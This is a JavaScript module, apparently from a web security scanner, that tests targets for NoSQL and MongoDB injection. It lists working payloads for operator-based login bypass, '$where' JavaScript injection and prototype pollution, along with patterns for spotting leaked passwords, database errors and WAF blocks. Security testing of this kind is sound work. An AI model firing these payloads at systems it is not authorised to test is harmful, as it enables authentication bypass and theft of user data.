/**
 * NoSQL / JSON Injection Scanner Module
 * Tests for MongoDB and other NoSQL injection vulnerabilities
 */

const payloads = {
  nosqlInjection: [
    // MongoDB Operator Injection
    '{"$gt": ""}',
    '{"$ne": null}',
    '{"$ne": ""}',
    '{"$exists": true}',
    '{"$regex": ".*"}',
    '{"$where": "1==1"}',
    '{"$or": [{"a": 1}, {"b": 2}]}',
    
    // Query Selector Injection
    '{"username": {"$ne": null}, "password": {"$ne": null}}',
    '{"username": {"$gt": ""}, "password": {"$gt": ""}}',
    '{"$where": "this.password.length > 0"}',
    '{"$where": "function() { return true; }"}',
    
    // JSON Injection
    '{"name": {"$ne": null}}',
    '{"debug": {"$gt": ""}}',
    '{"admin": true}',
    '{"role": "admin"}',
    '{"isAdmin": true, "__proto__": {"admin": true}}',
    
    // Prototype Pollution
    '{"__proto__": {"admin": true}}',
    '{"constructor": {"prototype": {"admin": true}}}',
    '{"__proto__": {"isAdmin": true}}',
    
    // Array Injection
    '{"$in": [1, 2, 3]}',
    '{"ids": {"$in": [1, 2, 3, 4, 5]}}',
    
    // Bypass Attempts
    'true, $where: "1 == 1"',
    '1, $or: [{}, {"a": "a"}]',
    '\'; return true; var dummy=\'',
    
    // JavaScript Injection in MongoDB
    '1; return true',
    '1\'; return true; var x=\'',
    'function() { return true; }',
  ]
};

// Patterns indicating NoSQL vulnerability
const vulnerabilityPatterns = [
  /mongodb/i,
  /mongoose/i,
  /bson/i,
  /objectid/i,
  /cannot read property/i,
  /unexpected token/i,
  /syntaxerror.*json/i,
  /cast.*error/i,
  /invalid.*operator/i,
  /\$where/i,
  /\$regex/i,
  /query.*failed/i,
];

// Success patterns (data leakage)
const successPatterns = [
  /"_id"\s*:/i,
  /"password"\s*:/i,
  /"email"\s*:/i,
  /\[".*"\]/,  // Array of results
  /\{".*":.*\}/,  // Multiple objects returned
];

function isWAFBlocked(response, responseBody) {
  const status = response.status;
  const bodyLower = responseBody.toLowerCase();
  
  const wafIndicators = [
    'you have been blocked', 'access denied', 'forbidden', 'firewall',
    'cloudflare', 'waf', 'attack detected', 'malicious'
  ];
  
  if (status === 403 || status === 406 || status === 429) {
    if (wafIndicators.some(ind => bodyLower.includes(ind))) return true;
  }
  if (bodyLower.includes('cloudflare ray id')) return true;
  return false;
}

function analyzeResponse(response, payload, originalStatus = null) {
  const result = {
    vulnerable: false,
    confidence: 'low',
    indicators: [],
    notes: ''
  };

  const responseBody = typeof response.data === 'string' 
    ? response.data 
    : JSON.stringify(response.data || '');

  // Check WAF
  if (isWAFBlocked(response, responseBody)) {
    result.indicators.push('✅ WAF/Firewall blocked the request');
    result.notes = 'PROTECTED: Request was blocked by security controls';
    return result;
  }

  // Check for error responses
  if (response.status >= 400 && response.status < 500) {
    result.indicators.push(`Request rejected with status ${response.status}`);
    result.notes = 'SAFE: Server rejected the malformed request';
    return result;
  }

  // Check for NoSQL error patterns
  for (const pattern of vulnerabilityPatterns) {
    if (pattern.test(responseBody)) {
      result.vulnerable = true;
      result.confidence = 'high';
      result.indicators.push('⚠️ NoSQL/MongoDB error message detected');
      result.notes = 'VULNERABLE: Database error exposed in response';
      break;
    }
  }

  // Check for data leakage
  if (response.status === 200) {
    for (const pattern of successPatterns) {
      if (pattern.test(responseBody)) {
        // Check if response has more data than expected
        if (responseBody.length > 500 && payload.includes('$ne')) {
          result.vulnerable = true;
          result.confidence = 'medium';
          result.indicators.push('⚠️ Potential data leakage with NoSQL operators');
          result.notes = 'SUSPICIOUS: Large response with injection payload';
        }
        break;
      }
    }
  }

  // Check for authentication bypass
  if (payload.includes('$ne') || payload.includes('$gt')) {
    if (response.status === 200 && /token|session|jwt|success|authenticated/i.test(responseBody)) {
      result.vulnerable = true;
      result.confidence = 'high';
      result.indicators.push('⚠️ Potential authentication bypass');
      result.notes = 'VULNERABLE: NoSQL injection may have bypassed authentication';
    }
  }

  if (!result.vulnerable) {
    result.indicators.push('No NoSQL injection indicators found');
    result.notes = 'SAFE: No NoSQL injection vulnerabilities detected';
  }

  return result;
}

function getPayloads() {
  return payloads.nosqlInjection;
}

function getType() {
  return 'NoSQL Injection';
}

function getSeverity() {
  return 'Critical';
}

module.exports = {
  getPayloads,
  analyzeResponse,
  getType,
  getSeverity
};

